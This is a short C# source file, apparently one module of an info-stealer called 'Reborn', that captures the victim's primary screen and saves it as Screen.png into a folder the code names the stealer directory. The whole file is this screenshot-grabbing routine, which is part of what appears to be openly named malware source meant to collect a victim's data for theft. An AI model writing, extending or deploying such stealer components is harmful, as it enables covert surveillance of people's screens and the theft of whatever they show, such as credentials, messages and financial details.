using System.Drawing;
using System.Drawing.Imaging;

namespace Reborn
{
    class Screen
    {
        public static void GetScreen()
        {
            string Stealer_Dir = Help.StealerDir;
            int width = System.Windows.Forms.Screen.PrimaryScreen.Bounds.Width;
            int height = System.Windows.Forms.Screen.PrimaryScreen.Bounds.Height;
            Bitmap bitmap = new Bitmap(width, height);
            Graphics.FromImage(bitmap).CopyFromScreen(0, 0, 0, 0, bitmap.Size);
            bitmap.Save(Stealer_Dir + $"\\Screen.png", ImageFormat.Png);
        }
    }
}
